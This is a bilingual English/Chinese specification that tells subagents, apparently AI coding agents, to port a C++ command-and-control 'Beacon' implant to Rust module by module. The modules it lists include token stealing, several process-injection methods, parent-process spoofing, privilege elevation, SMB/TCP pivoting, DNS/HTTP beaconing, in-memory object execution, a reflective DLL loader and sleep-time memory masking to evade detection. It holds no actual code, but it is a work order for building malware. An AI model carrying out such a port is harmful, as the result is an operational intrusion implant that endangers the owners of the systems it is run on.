# Beacon Rust Port — Module Contracts / 模块契约

[English](#english) | [中文](#chinese)

---

## English

This file defines the cross-module API surface for the Rust port of the C++
Beacon in `../../src/`. Each subagent ports one C++ file (or cluster) into a
Rust module under `rust/beacon-core/src/`. **Read the C++ source file(s) and
port them faithfully**: same algorithms, same wire formats, same constants,
same error handling. Names become snake_case; `char*`/length pairs become
`&[u8]`/`Vec<u8>`; `BOOL` becomes `bool` or `i32` per `windows_sys`.

### Shared API (already implemented — DO NOT modify these files)

- `crate::state` — globals: `sleep_time()/set_sleep_time(u32)`,
  `jitter()/set_jitter(u32)`, `agentid()/set_agentid(u32)`,
  `post_type()/set_post_type(u32)`, `http_post_len()/set_http_post_len(i32)`,
  `atoken()/set_atoken(isize)`, `BIGSESSION: Mutex<SessData>` (SessData
  { myid: i32, length: usize, data: [u8;1024] }), `POST_URL: Mutex<Vec<u8>>`,
  `DNSBEACON_PUTOUTPUT: Mutex<Vec<u8>>`, `THREAD_COUNT`, `MAJOR_VERSION`,
  `DNS_BEACON: AtomicBool`, `NONCE`.
- `crate::parse` — `DataP`: `data_alloc(n)`, `init(&mut [u8])`, `data_int()`,
  `data_byte()`, `data_short()`, `data_ptr(n) -> Option<&[u8]>`,
  `data_extract()`, `data_string(&mut [u8], max) -> usize`, `data_string_asciiz()`,
  `data_ptr_extract()`, `data_length()`, `data_buffer()`, `cleanup()`.
- `crate::bformat` — `FormatP`: `init(maxsz)`, `bformat_int(i32)`,
  `bformat_copy(&[u8])`, `bformat_printf(format_args!)`, `bformat_string() -> &[u8]`,
  `bformat_length()`, `free()`, `reset()`. Use `bformat_printf(format_args!("...", x))`.
- `crate::build` — `Builder`: `init(max)`, `add_int(u32)`, `add_short(u16)`,
  `add_byte(u8)`, `add_data(&[u8])`, `length()`, `length_rsa()`, `dest() -> &[u8]`,
  `payload_len()`.
- `crate::settings` — `setting_short(usize) -> u16`, `setting_int(usize) -> u32`,
  `setting_option(usize, u16) -> bool`, `setting_ptr(usize) -> Option<&'static [u8]>`,
  `setting_len(usize) -> usize`, `settings_init(usize)`, `get_beacon_ptr()`.
- `crate::beacon` — constants (SETTING_*, BEACON_PROTO_*, EXIT_FUNK_*,
  HOST_STRATEGY_*), `bigger_rand() -> u32`, `genagentid() -> u32`.
- `crate::security` — `security_init(&[u8])`, `security_encrypt(&mut [u8], len) -> i32`,
  `security_decrypt(&mut [u8], len) -> i32`, `rsa_encrypt_once(&[u8], &[u8], &mut [u8], &mut usize) -> i32`,
  `KEY_SIZE/HASH_SIZE/HMAC_SIZE` consts, watermark helpers.
- `crate::encoders` — `netbios_encode(u8,&[u8],&mut [u8],max)->usize`,
  `netbios_decode`, `base64url_encode(&[u8],&mut [u8])->usize`,
  `base64url_decode(&[u8],max,&mut [u8])->usize`, `xor_encode`, `xor_decode`.
- `crate::callback` — `Callback = fn(&[u8], i32, i32)`,
  `command_shell_encrypt(&[u8], usize, i32) -> Option<Vec<u8>>`,
  `command_shell_chunk_maybe(&[u8], usize, i32)`, `command_shell_chunk(&[u8], usize, i32)`,
  `command_shell_callback(&[u8], i32, i32)`, `command_shell_post(&[u8], usize, i32, bool)`,
  `post_error_na(i32)`, `post_error_d(i32, i32)`, `post_error_s(i32, &[u8])`,
  `post_error_sd(i32, &[u8], i32)`, `post_error_dd(i32,i32,i32)`,
  `post_crypt_replay_error(u32)`, `register_command_shell_post(fn(&[u8],usize,i32,bool))`.
  Callback constants live in `crate::commands` (CALLBACK_*).
- `crate::channel` — `http_init(&[u8] host, u16 port, &[u8] ua)`, `http_close()`,
  `http_put(&[u8] hook, &[u8], usize, bool postNow)`, `http_post_maybe(&[u8])`,
  `http_get(&[u8] hook, &SessData, &mut [u8], usize) -> i32`.
- `crate::channel_tcp` — `channel_winsock_init()`, `channel_localip() -> u32`,
  `channel_lookup(&[u8], &mut u32) -> bool`, `channel_lookup_retry(&[u8], i32) -> u32`,
  `dns_get(&[u8], &mut [u8], usize) -> usize`, `dns_get6`, `dns_put(&[u8], &[u8], &[u8], usize)`,
  `dns_get_txt(&[u8], &mut [u8], usize) -> i32`, `set_max_dns(u32)`.
- `crate::strategy` — `StrategyInfo { strategy: i32, rotation_timer: i32,
  failover_timer: i32, failover_maxfail: i32 }`, `strategy_setup(&mut StrategyInfo, i32, i32, i32, i32)`,
  `next_host(&[u8], bool, &StrategyInfo) -> Option<Vec<u8>>`,
  `check_max_retry(bool, &mut i32, &mut u32, &mut u32) -> bool`.
- `crate::profile` — `Profile { headers, parameters, uri, buffer, blen, temp, stage, max }`,
  `profile_setup(&mut Profile, usize)`, `profile_free(&mut Profile)`,
  `apply(&[u8] prog, &mut Profile, &[u8] arg1, usize len1, &[u8] arg2, usize len2)`,
  `recover(&[u8] prog, &mut [u8] buf, usize read, usize max) -> usize`.
- `crate::thread` — `run_thread_start(FnOnce())`, `safe_exit()`.
- `crate::functions` — `disable_wow64(&mut *mut c_void)`, `revert_wow64(*mut c_void)`.
- `crate::track_memory` — `track_memory_add(usize, usize, i32, bool, Option<Box<dyn FnOnce()+Send>>)`,
  `track_memory_cleanup()`, `track_memory_get_heap_records_to_mask() -> Vec<HeapRecord>`.

### Conventions

- Win32: use `windows_sys` (already a dependency with the needed features).
  e.g. `windows_sys::Win32::System::Threading::CreateProcessA`.
- `HANDLE` in `windows_sys` is `*mut c_void` (isize-compatible); store as
  `isize` where the C code used `HANDLE`, cast at call sites.
- Callbacks of type `Callback` are passed as `fn` pointers where the C code
  passed function pointers; when the C code calls `cb(buffer, length, type)`
  with NULL buffer, call `cb(&[], 0, CALLBACK_...)`.
- Never allocate inside hot loops; reuse buffers where the C code did.
- Keep the exact same byte layouts: network byte order (`to_be_bytes`) for
  ints/shorts on the wire; `SessData.data` is the RSA ciphertext.
- `register_command_shell_post` is called by entry crates; `command_shell_post`
  in callback.rs dispatches through it (default: HTTP).
- Each module: `//! Port of <file>.cpp` doc comment at top.
- No `Box::leak` (use owned data / OnceLock / Mutex). Use `parking_lot::Mutex`.

### Module → File map (what you port)

Port the exact function bodies from the C++ into Rust. Where the C++ used
`datap`/`formatp`/`builder`, use the Rust equivalents above. Where it used
`track_memory_add`, call it with `ptr as usize`.

#### tokens.rs ← src/tokens.cpp
Public: `token_guard_start()`, `token_guard_stop()`,
`token_guard_start_maybe(bool)`, `token_guard_stop_maybe(bool)`,
`command_rev2self()`, `token_user(isize, &mut [u8]) -> bool`,
`command_getuid(&[u8], i32, Callback)`, `command_steal_token(&[u8], i32, Callback)`,
`command_loginuser(&[u8], i32, Callback)`, `logintoken(&[u8], &[u8], &[u8], Callback)`,
`is_admin() -> bool`, `use_token(isize, &[u8], usize) -> bool`.
Global `atoken` is in `crate::state`.

#### commands.rs ← src/commands.cpp (big)
Public (all commands): `command_die(Callback)`, `command_cd(&[u8], usize)`,
`command_setenv(&[u8], usize)`, `command_sleep(&[u8], usize)`,
`command_execute(&[u8], usize)`, `command_runu(&[u8], usize)`,
`to_wide_char(&[u8], &mut [u16]) -> bool`, `command_runas(&[u8], usize, Callback)`,
`command_execjob(&[u8], usize)`, `command_upload(&[u8], usize, &[u8])`,
`command_pwd(Callback)`, `command_pause(&[u8], usize)`,
`wsconnect(&[u8], i32) -> isize` (SOCKET), `command_stage_payload(&[u8], usize)`,
`command_stage_payload_smb(&[u8], usize)`, `check_kill_date() -> bool`,
`bad_watermark() -> bool`, `bad_watermark_hash() -> bool`.
Also CALLBACK_* constants (from commands.h) and `POST_HTTP/POST_DNS/POST_SMB/POST_TCP`.
References `crate::process` (execute_program_with_ppid etc.) — see below.

#### proto.rs ← src/proto.cpp
`process_message(u32, &[u8], usize)` dispatch, `process_payload(&mut [u8], usize)`.
All COMMAND_* constants.

#### jobs.rs ← src/jobs.cpp
`cleanup_process(pi)`, `psh_track(...)`, `process_track(...) -> &mut PshEntry`,
`pipe_track(...)`, `psh_poll(Callback, usize)`, `read_all_from_pipe`,
`read_blob_from_pipe`, `connect_pipe(&[u8], &mut isize) -> bool`,
`connect_pipe_level(&[u8], &mut isize, u32) -> bool`, `pipe_try(isize, u32)`,
`command_job_register(&[u8], usize, bool, i16)`, `command_jobs(Callback)`,
`command_job_kill(&[u8], usize)`, `command_job_spawn(&[u8], usize, bool, bool)`.
Job list is a process-global linked list → use a `Mutex<Vec<PshEntry>>` static.

#### process modules ← execute.cpp, spawn.cpp, process_block.cpp, process_ppid.cpp, ppidfriends.cpp
- `execute.rs`: `execute_program(&mut ProcessContext) -> bool`, `runas(&[u8], &[u8], &[u8], &[u8], u32, &mut Pi) -> bool`.
- `process_block.rs`: `process_blockdlls() -> ExAttrMod`.
- `process_ppid.rs`: `process_ppid() -> ExAttrMod`, `execute_program_with_default_ppid(...)`.
- `ppidfriends.rs`: `execute_program_with_ppid(&[u8], usize, &mut Si, &mut Pi, u32, bool, i32) -> bool`,
  `spoof_ppid_teb_pre(&mut u32)`, `spoof_ppid_teb_post(u32)`.
- `spawn.rs`: `command_spawnproc(&[u8], usize, bool)`, `spawn_patsy(bool, bool, &mut Si, &mut Pi) -> bool`,
  `spawn_patsy_as`, `spawn_patsy_u`, `spawn_populate(bool, &mut [u8])`,
  `command_spawnas`, `command_spawnu`, `command_ppid`, `env_expand` (in filesys.rs).
Types (from process.h): `ProcessContext { cbuffer: Vec<u8>, clen: usize, si: *mut c_void, pi: *mut c_void, flags: u32, ignore_token: bool }`,
`ExAttrMod { pre: Option<fn(*mut c_void, i32, *mut c_void, *mut c_void)>, post: Option<fn(*mut c_void)>, harg: isize, parg: u64, oerr: u32 }`.
`MAX_RUNAS_CMD = 16384`.

#### inject.rs + inject_*.rs ← src/inject.cpp + inject_*.cpp
From inject.h: `inject_via_remotethread_wow64`, `inject_via_remotethread`,
`inject_via_createuserthread`, `inject_via_createthread`,
`inject_with_hinted_func(u32, isize, *mut c_void, *mut c_void, &[u8], &[u8], u32) -> bool`,
`is_x64_process(isize) -> bool`, `inject_process_logic(...)`,
`local_mirror_data(&[u8]) -> *mut u8`, `command_inject(&[u8], usize, bool, bool)`,
`command_inject_pid`, `command_inject_ping`, `command_inject_pid_ping`,
`SetupSmartInject(&mut InjectContext, &[u8], usize)`, `inject_via_apcthread`,
`inject_via_apcthread_targeted`, `inject_via_resumethread`,
`remote_mirror_data(&mut InjectContext, &[u8]) -> *mut u8`,
`finalize_memory_permissions(*mut u8, usize) -> bool`.
`InjectContext { hProcess: isize, hThread: isize, pid: u32, target_arch: u8, my_arch: u8, same_arch: bool, same_pid: bool, is_suspended: bool }`.
PI_EXEC_* and INJECT_ARCH_* constants.

#### link.rs, link_tcp.rs, link_smb.rs ← src/link.cpp, link_tcp.cpp, link_smb.cpp
`LChannel` struct with fn-pointer fields (read/write/close/flush/ready/wait),
`lchannel_smb(isize) -> LChannel`, `lchannel_tcp(isize) -> LChannel`,
`link_register(LChannel, i32, Callback) -> bool`, `link_poll(Callback)`,
`link_frame_header(i32, i32, &mut usize) -> Vec<u8>`, `write_all(isize, &[u8]) -> bool`,
`command_link_start`, `command_link_start_explicit`, `command_link_stop`,
`command_link_route`, `command_link_reopen`, `command_link_wait`,
`command_tcp_connect(&[u8], usize, Callback)`. HINT_* constants.

#### client.rs, client_tcp.rs, client_smb.rs, client_smb_extc2.rs ← src/client*.cpp
`client_init(LChannel)`, `client_stop()`, `client_flush()`, `client_process()`,
`client_close()`, `client_write(&[u8], usize)`, `command_link_wait()`,
`command_tcp_reverse_start()`, `command_tcp_bind_start()`, `tcp_init() -> bool`,
`tcp_stop()`, `wsconnect(&[u8], i32) -> isize`, `GargleAccept(isize) -> isize`,
`GargleWaitTCP(isize)`, `command_link_start(&[u8], usize, Callback)`,
`connect_pipe(...)` for SMB.

#### pivot.rs ← src/pivot.cpp
`command_connect(&[u8], usize, Callback)`, `command_send`, `command_close`,
`command_listen`, `command_socket_bind(&[u8], usize, u32)`,
`command_socket_close`, `command_socket_tcppivot`, `pivot_poll(Callback)`,
`download_poll(Callback, usize)`, `token_report(Callback)`, `psh_poll(Callback, usize)`.
(Look at the C++ for the actual function list — port everything defined there.)

#### webserver.rs ← src/webserver.cpp
`command_webserver_local(&[u8], usize)`, local HTTP server (WinINet or sockets).

#### files.rs, filesys.rs, ps.rs, recurse.rs, powershell.rs
- files.rs: `command_download(&[u8], usize, Callback)`, `command_download_stop`.
- filesys.rs: `command_file_list/mkdir/drives/delete/copy/move`, `command_upload`,
  `env_expand(&[u8], &mut [u8], usize) -> u32`.
- ps.rs: `command_ps_list`, `command_ps_kill`, `is_x64_process(isize) -> bool`.
- recurse.rs: `recurse(&[u8], RCALLBACK)` with `RCALLBACK = fn(&[u8], &[u8], bool)`.
- powershell.rs: `command_psh_import`, `command_psh_host_tcp`.

#### argue.rs, elevate.rs, boff.rs, inlineexec.rs, hotbeef.rs
- argue.rs: `command_argue_add/remove/list`, ARGUMENT_RECORD handling.
- elevate.rs: `command_elevate_pre`, `command_elevate_post`, `command_getprivs`,
  `command_getsystem`, `command_elevate_run_inject`, `is_wow64(isize) -> bool`,
  `is_x64() -> bool`.
- boff.rs: BOF parser/executor (boff.cpp).
- inlineexec.rs: `command_inline_execute`, `command_inline_execute_object`,
  `inline_execute(&[u8], usize, &[u8], usize) -> bool`.
- hotbeef.rs: syscall/shim helpers as in hotbeef.cpp.

#### gargle.rs, gargleint.rs, gargle_pivot_smb.rs, gargle_pivot_tcp.rs
`GargleSleep(u32)`, `gargle_trampoline(...)`, gargle memory-masking logic.
In Rust, implement the masking of tracked heap records + section masking; the
trampoline (raw asm) is replaced by a documented safe equivalent that masks
the same memory ranges. `GarglePivotSMB`/`GarglePivotTCP` accept/wait variants.

#### Entry crates (separate dirs)
`beacon/`, `dnsb/`, `pivot/`, `extc2/` — each has DllMain + `beacon()` loop
mirroring beacon.cpp / dnsb.cpp / beacon_pivot.cpp / beacon_extc2.cpp, plus
`ReflectiveLoader` with the sled (INT3/NOP filler) reproduced as bytes.

### Acceptance for each module

- `cargo check` must pass once integrated (you do NOT need to run it
  mid-flight; the integrator runs it).
- Every function in the C++ file you port must exist (port everything, even
  if it looks unused — other modules call it).
- Keep wire formats and constants byte-identical.
- Add `//! Port of <file>` header and short doc comments.

---

## 中文

本文件定义 `../../src/` 中 C++ Beacon Rust 移植版的跨模块 API 表面。
每个子代理将其中一个 C++ 文件（或文件簇）移植到
`rust/beacon-core/src/` 下的 Rust 模块。**请阅读 C++ 源文件并忠实移植**：
相同的算法、相同的线格式、相同的常量、相同的错误处理。命名转为
snake_case；`char*`/长度对转为 `&[u8]`/`Vec<u8>`；`BOOL` 按
`windows_sys` 约定转为 `bool` 或 `i32`。

### 共享 API（已实现 —— 请勿修改这些文件）

- `crate::state` —— 全局量：`sleep_time()/set_sleep_time(u32)`、
  `jitter()/set_jitter(u32)`、`agentid()/set_agentid(u32)`、
  `post_type()/set_post_type(u32)`、`http_post_len()/set_http_post_len(i32)`、
  `atoken()/set_atoken(isize)`、`BIGSESSION: Mutex<SessData>`（SessData
  { myid: i32, length: usize, data: [u8;1024] }）、`POST_URL: Mutex<Vec<u8>>`、
  `DNSBEACON_PUTOUTPUT: Mutex<Vec<u8>>`、`THREAD_COUNT`、`MAJOR_VERSION`、
  `DNS_BEACON: AtomicBool`、`NONCE`。
- `crate::parse` —— `DataP`：`data_alloc(n)`、`init(&mut [u8])`、`data_int()`、
  `data_byte()`、`data_short()`、`data_ptr(n) -> Option<&[u8]>`、
  `data_extract()`、`data_string(&mut [u8], max) -> usize`、`data_string_asciiz()`、
  `data_ptr_extract()`、`data_length()`、`data_buffer()`、`cleanup()`。
- `crate::bformat` —— `FormatP`：`init(maxsz)`、`bformat_int(i32)`、
  `bformat_copy(&[u8])`、`bformat_printf(format_args!)`、`bformat_string() -> &[u8]`、
  `bformat_length()`、`free()`、`reset()`。使用 `bformat_printf(format_args!("...", x))`。
- `crate::build` —— `Builder`：`init(max)`、`add_int(u32)`、`add_short(u16)`、
  `add_byte(u8)`、`add_data(&[u8])`、`length()`、`length_rsa()`、`dest() -> &[u8]`、
  `payload_len()`。
- `crate::settings` —— `setting_short(usize) -> u16`、`setting_int(usize) -> u32`、
  `setting_option(usize, u16) -> bool`、`setting_ptr(usize) -> Option<&'static [u8]>`、
  `setting_len(usize) -> usize`、`settings_init(usize)`、`get_beacon_ptr()`。
- `crate::beacon` —— 常量（SETTING_*、BEACON_PROTO_*、EXIT_FUNK_*、
  HOST_STRATEGY_*）、`bigger_rand() -> u32`、`genagentid() -> u32`。
- `crate::security` —— `security_init(&[u8])`、`security_encrypt(&mut [u8], len) -> i32`、
  `security_decrypt(&mut [u8], len) -> i32`、`rsa_encrypt_once(&[u8], &[u8], &mut [u8], &mut usize) -> i32`、
  `KEY_SIZE/HASH_SIZE/HMAC_SIZE` 常量、水印辅助函数。
- `crate::encoders` —— `netbios_encode(u8,&[u8],&mut [u8],max)->usize`、
  `netbios_decode`、`base64url_encode(&[u8],&mut [u8])->usize`、
  `base64url_decode(&[u8],max,&mut [u8])->usize`、`xor_encode`、`xor_decode`。
- `crate::callback` —— `Callback = fn(&[u8], i32, i32)`、
  `command_shell_encrypt(&[u8], usize, i32) -> Option<Vec<u8>>`、
  `command_shell_chunk_maybe(&[u8], usize, i32)`、`command_shell_chunk(&[u8], usize, i32)`、
  `command_shell_callback(&[u8], i32, i32)`、`command_shell_post(&[u8], usize, i32, bool)`、
  `post_error_na(i32)`、`post_error_d(i32, i32)`、`post_error_s(i32, &[u8])`、
  `post_error_sd(i32, &[u8], i32)`、`post_error_dd(i32,i32,i32)`、
  `post_crypt_replay_error(u32)`、`register_command_shell_post(fn(&[u8],usize,i32,bool))`。
  回调常量位于 `crate::commands`（CALLBACK_*）。
- `crate::channel` —— `http_init(&[u8] host, u16 port, &[u8] ua)`、`http_close()`、
  `http_put(&[u8] hook, &[u8], usize, bool postNow)`、`http_post_maybe(&[u8])`、
  `http_get(&[u8] hook, &SessData, &mut [u8], usize) -> i32`。
- `crate::channel_tcp` —— `channel_winsock_init()`、`channel_localip() -> u32`、
  `channel_lookup(&[u8], &mut u32) -> bool`、`channel_lookup_retry(&[u8], i32) -> u32`、
  `dns_get(&[u8], &mut [u8], usize) -> usize`、`dns_get6`、`dns_put(&[u8], &[u8], &[u8], usize)`、
  `dns_get_txt(&[u8], &mut [u8], usize) -> i32`、`set_max_dns(u32)`。
- `crate::strategy` —— `StrategyInfo { strategy: i32, rotation_timer: i32,
  failover_timer: i32, failover_maxfail: i32 }`、`strategy_setup(&mut StrategyInfo, i32, i32, i32, i32)`、
  `next_host(&[u8], bool, &StrategyInfo) -> Option<Vec<u8>>`、
  `check_max_retry(bool, &mut i32, &mut u32, &mut u32) -> bool`。
- `crate::profile` —— `Profile { headers, parameters, uri, buffer, blen, temp, stage, max }`、
  `profile_setup(&mut Profile, usize)`、`profile_free(&mut Profile)`、
  `apply(&[u8] prog, &mut Profile, &[u8] arg1, usize len1, &[u8] arg2, usize len2)`、
  `recover(&[u8] prog, &mut [u8] buf, usize read, usize max) -> usize`。
- `crate::thread` —— `run_thread_start(FnOnce())`、`safe_exit()`。
- `crate::functions` —— `disable_wow64(&mut *mut c_void)`、`revert_wow64(*mut c_void)`。
- `crate::track_memory` —— `track_memory_add(usize, usize, i32, bool, Option<Box<dyn FnOnce()+Send>>)`、
  `track_memory_cleanup()`、`track_memory_get_heap_records_to_mask() -> Vec<HeapRecord>`。

### 约定

- Win32：使用 `windows_sys`（已是依赖，含所需特性）。
  例如 `windows_sys::Win32::System::Threading::CreateProcessA`。
- `windows_sys` 中 `HANDLE` 为 `*mut c_void`（与 isize 兼容）；在 C 代码
  使用 `HANDLE` 处以 `isize` 存储，调用处强转。
- `Callback` 类型回调在 C 代码传函数指针处以 `fn` 指针传递；当 C 代码以
  NULL 缓冲区调用 `cb(buffer, length, type)` 时，调用 `cb(&[], 0, CALLBACK_...)`。
- 热循环内绝不分配；与 C 代码一致地复用缓冲区。
- 保持完全相同的字节布局：线上整型/短整型用网络字节序（`to_be_bytes`）；
  `SessData.data` 为 RSA 密文。
- `register_command_shell_post` 由条目 crate 调用；`callback.rs` 中的
  `command_shell_post` 经其分发（默认 HTTP）。
- 每个模块：顶部加 `//! Port of <file>.cpp` 文档注释。
- 不使用 `Box::leak`（用自有数据 / OnceLock / Mutex）。使用 `parking_lot::Mutex`。

### 模块 → 文件映射（你要移植的内容）

将 C++ 函数体精确移植到 Rust。C++ 使用 `datap`/`formatp`/`builder`
处改用上述 Rust 对应物；使用 `track_memory_add` 处传 `ptr as usize`。

#### tokens.rs ← src/tokens.cpp
公开：`token_guard_start()`、`token_guard_stop()`、
`token_guard_start_maybe(bool)`、`token_guard_stop_maybe(bool)`、
`command_rev2self()`、`token_user(isize, &mut [u8]) -> bool`、
`command_getuid(&[u8], i32, Callback)`、`command_steal_token(&[u8], i32, Callback)`、
`command_loginuser(&[u8], i32, Callback)`、`logintoken(&[u8], &[u8], &[u8], Callback)`、
`is_admin() -> bool`、`use_token(isize, &[u8], usize) -> bool`。
全局 `atoken` 位于 `crate::state`。

#### commands.rs ← src/commands.cpp（较大）
公开（全部命令）：`command_die(Callback)`、`command_cd(&[u8], usize)`、
`command_setenv(&[u8], usize)`、`command_sleep(&[u8], usize)`、
`command_execute(&[u8], usize)`、`command_runu(&[u8], usize)`、
`to_wide_char(&[u8], &mut [u16]) -> bool`、`command_runas(&[u8], usize, Callback)`、
`command_execjob(&[u8], usize)`、`command_upload(&[u8], usize, &[u8])`、
`command_pwd(Callback)`、`command_pause(&[u8], usize)`、
`wsconnect(&[u8], i32) -> isize`（SOCKET）、`command_stage_payload(&[u8], usize)`、
`command_stage_payload_smb(&[u8], usize)`、`check_kill_date() -> bool`、
`bad_watermark() -> bool`、`bad_watermark_hash() -> bool`。
另有 CALLBACK_* 常量（来自 commands.h）与
`POST_HTTP/POST_DNS/POST_SMB/POST_TCP`。引用 `crate::process`
（execute_program_with_ppid 等）——见下文。

#### proto.rs ← src/proto.cpp
`process_message(u32, &[u8], usize)` 分发、`process_payload(&mut [u8], usize)`。
全部 COMMAND_* 常量。

#### jobs.rs ← src/jobs.cpp
`cleanup_process(pi)`、`psh_track(...)`、`process_track(...) -> &mut PshEntry`、
`pipe_track(...)`、`psh_poll(Callback, usize)`、`read_all_from_pipe`、
`read_blob_from_pipe`、`connect_pipe(&[u8], &mut isize) -> bool`、
`connect_pipe_level(&[u8], &mut isize, u32) -> bool`、`pipe_try(isize, u32)`、
`command_job_register(&[u8], usize, bool, i16)`、`command_jobs(Callback)`、
`command_job_kill(&[u8], usize)`、`command_job_spawn(&[u8], usize, bool, bool)`。
作业列表是进程级链表 → 用 `Mutex<Vec<PshEntry>>` 静态量。

#### process 模块 ← execute.cpp、spawn.cpp、process_block.cpp、process_ppid.cpp、ppidfriends.cpp
- `execute.rs`：`execute_program(&mut ProcessContext) -> bool`、`runas(&[u8], &[u8], &[u8], &[u8], u32, &mut Pi) -> bool`。
- `process_block.rs`：`process_blockdlls() -> ExAttrMod`。
- `process_ppid.rs`：`process_ppid() -> ExAttrMod`、`execute_program_with_default_ppid(...)`。
- `ppidfriends.rs`：`execute_program_with_ppid(&[u8], usize, &mut Si, &mut Pi, u32, bool, i32) -> bool`、
  `spoof_ppid_teb_pre(&mut u32)`、`spoof_ppid_teb_post(u32)`。
- `spawn.rs`：`command_spawnproc(&[u8], usize, bool)`、`spawn_patsy(bool, bool, &mut Si, &mut Pi) -> bool`、
  `spawn_patsy_as`、`spawn_patsy_u`、`spawn_populate(bool, &mut [u8])`、
  `command_spawnas`、`command_spawnu`、`command_ppid`、`env_expand`（在 filesys.rs）。
类型（来自 process.h）：`ProcessContext { cbuffer: Vec<u8>, clen: usize, si: *mut c_void, pi: *mut c_void, flags: u32, ignore_token: bool }`、
`ExAttrMod { pre: Option<fn(*mut c_void, i32, *mut c_void, *mut c_void)>, post: Option<fn(*mut c_void)>, harg: isize, parg: u64, oerr: u32 }`。
`MAX_RUNAS_CMD = 16384`。

#### inject.rs + inject_*.rs ← src/inject.cpp + inject_*.cpp
来自 inject.h：`inject_via_remotethread_wow64`、`inject_via_remotethread`、
`inject_via_createuserthread`、`inject_via_createthread`、
`inject_with_hinted_func(u32, isize, *mut c_void, *mut c_void, &[u8], &[u8], u32) -> bool`、
`is_x64_process(isize) -> bool`、`inject_process_logic(...)`、
`local_mirror_data(&[u8]) -> *mut u8`、`command_inject(&[u8], usize, bool, bool)`、
`command_inject_pid`、`command_inject_ping`、`command_inject_pid_ping`、
`SetupSmartInject(&mut InjectContext, &[u8], usize)`、`inject_via_apcthread`、
`inject_via_apcthread_targeted`、`inject_via_resumethread`、
`remote_mirror_data(&mut InjectContext, &[u8]) -> *mut u8`、
`finalize_memory_permissions(*mut u8, usize) -> bool`。
`InjectContext { hProcess: isize, hThread: isize, pid: u32, target_arch: u8, my_arch: u8, same_arch: bool, same_pid: bool, is_suspended: bool }`。
PI_EXEC_* 与 INJECT_ARCH_* 常量。

#### link.rs、link_tcp.rs、link_smb.rs ← src/link.cpp、link_tcp.cpp、link_smb.cpp
`LChannel` 结构体含函数指针字段（read/write/close/flush/ready/wait）、
`lchannel_smb(isize) -> LChannel`、`lchannel_tcp(isize) -> LChannel`、
`link_register(LChannel, i32, Callback) -> bool`、`link_poll(Callback)`、
`link_frame_header(i32, i32, &mut usize) -> Vec<u8>`、`write_all(isize, &[u8]) -> bool`、
`command_link_start`、`command_link_start_explicit`、`command_link_stop`、
`command_link_route`、`command_link_reopen`、`command_link_wait`、
`command_tcp_connect(&[u8], usize, Callback)`。HINT_* 常量。

#### client.rs、client_tcp.rs、client_smb.rs、client_smb_extc2.rs ← src/client*.cpp
`client_init(LChannel)`、`client_stop()`、`client_flush()`、`client_process()`、
`client_close()`、`client_write(&[u8], usize)`、`command_link_wait()`、
`command_tcp_reverse_start()`、`command_tcp_bind_start()`、`tcp_init() -> bool`、
`tcp_stop()`、`wsconnect(&[u8], i32) -> isize`、`GargleAccept(isize) -> isize`、
`GargleWaitTCP(isize)`、`command_link_start(&[u8], usize, Callback)`、
`connect_pipe(...)`（SMB）。

#### pivot.rs ← src/pivot.cpp
`command_connect(&[u8], usize, Callback)`、`command_send`、`command_close`、
`command_listen`、`command_socket_bind(&[u8], usize, u32)`、
`command_socket_close`、`command_socket_tcppivot`、`pivot_poll(Callback)`、
`download_poll(Callback, usize)`、`token_report(Callback)`、`psh_poll(Callback, usize)`。
（以 C++ 实际函数清单为准——移植其中定义的全部内容。）

#### webserver.rs ← src/webserver.cpp
`command_webserver_local(&[u8], usize)`、本地 HTTP 服务器（WinINet 或套接字）。

#### files.rs、filesys.rs、ps.rs、recurse.rs、powershell.rs
- files.rs：`command_download(&[u8], usize, Callback)`、`command_download_stop`。
- filesys.rs：`command_file_list/mkdir/drives/delete/copy/move`、`command_upload`、
  `env_expand(&[u8], &mut [u8], usize) -> u32`。
- ps.rs：`command_ps_list`、`command_ps_kill`、`is_x64_process(isize) -> bool`。
- recurse.rs：`recurse(&[u8], RCALLBACK)`，`RCALLBACK = fn(&[u8], &[u8], bool)`。
- powershell.rs：`command_psh_import`、`command_psh_host_tcp`。

#### argue.rs、elevate.rs、boff.rs、inlineexec.rs、hotbeef.rs
- argue.rs：`command_argue_add/remove/list`、ARGUMENT_RECORD 处理。
- elevate.rs：`command_elevate_pre`、`command_elevate_post`、`command_getprivs`、
  `command_getsystem`、`command_elevate_run_inject`、`is_wow64(isize) -> bool`、
  `is_x64() -> bool`。
- boff.rs：BOF 解析/执行器（boff.cpp）。
- inlineexec.rs：`command_inline_execute`、`command_inline_execute_object`、
  `inline_execute(&[u8], usize, &[u8], usize) -> bool`。
- hotbeef.rs：hotbeef.cpp 中的 syscall/shim 辅助函数。

#### gargle.rs、gargleint.rs、gargle_pivot_smb.rs、gargle_pivot_tcp.rs
`GargleSleep(u32)`、`gargle_trampoline(...)`、gargle 内存掩码逻辑。
在 Rust 中实现跟踪堆记录掩码 + 节掩码；蹦床（原始汇编）替换为文档化的
安全等价实现，掩码相同的内存范围。`GarglePivotSMB`/`GarglePivotTCP`
accept/wait 变体。

#### 条目 crate（独立目录）
`beacon/`、`dnsb/`、`pivot/`、`extc2/` —— 各含 DllMain + `beacon()` 主循环，
对应 beacon.cpp / dnsb.cpp / beacon_pivot.cpp / beacon_extc2.cpp，另有
`ReflectiveLoader`（INT3/NOP 填充 sled 以字节重现）。

### 每个模块的验收标准

- 集成后 `cargo check` 必须通过（你无需中途运行；由集成方运行）。
- C++ 文件中的每个函数都必须存在（全部移植，即使看似未用——其他模块
  会调用）。
- 保持线格式与常量字节级一致。
- 加 `//! Port of <file>` 头注释与简短文档注释。
